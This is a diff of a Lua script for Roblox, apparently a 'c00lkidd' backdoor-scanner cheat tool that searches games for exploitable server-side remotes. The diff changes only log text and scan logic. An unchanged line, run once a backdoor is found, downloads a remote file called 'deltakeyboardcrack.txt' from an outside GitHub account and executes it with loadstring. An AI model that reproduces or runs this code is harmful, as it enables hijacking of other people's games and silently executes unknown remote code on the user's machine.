@@ -2722,7 +2722,7 @@ local function fireRemoteEvent(code)
 		if remoteEvent or remoteFunction then
 			script.Parent.Framee.Check.Visible = false
 			script.Parent.Framee.Log.Visible = true
-			script.Parent.Framee.Log.Text = "[" .. tostring(remoteEvent or remoteFunction) .. "]" .. "\n[" .. ((remoteEvent and remoteEvent.Name) or (remoteFunction and remoteFunction.Name) or "Unknown") .. "]"
+			script.Parent.Framee.Log.Text = "[" .. ((remoteEvent and remoteEvent.Name) or (remoteFunction and remoteFunction.Name) or "Unknown") .. "]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
 			notify.Info("Backdoor Found!","Scan time : " .. scanTime)
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt"))()
@@ -2866,10 +2866,19 @@ local playerGui = localPlayer:WaitForChild("PlayerGui")
 local function scanGui()
     for _, gui in ipairs(playerGui:GetChildren()) do
         if gui:IsA("ScreenGui") then
+            local hasRemote = false
+            local hasScript = false
+
             for _, descendant in ipairs(gui:GetDescendants()) do
-                if descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction") or descendant:IsA("Script") or descendant:IsA("LocalScript") then
-                    notify.Warn("c00lkidd","Possible Serverside found : "..gui.Name)
-		    notify.Error("c00lkidd","Scan at ur own risk as it may kicks you")
+                if descendant:IsA("RemoteEvent") or descendant:IsA("RemoteFunction") then
+                    hasRemote = true
+                elseif descendant:IsA("Script") or descendant:IsA("LocalScript") then
+                    hasScript = true
+                end
+
+                if hasRemote and hasScript then
+                    notify("c00lkidd", "Possible serverside found: " .. gui.Name)
+                    notify("c00lkidd", "Scan at your own risk as it may kick you")
                     return
                 end
             end
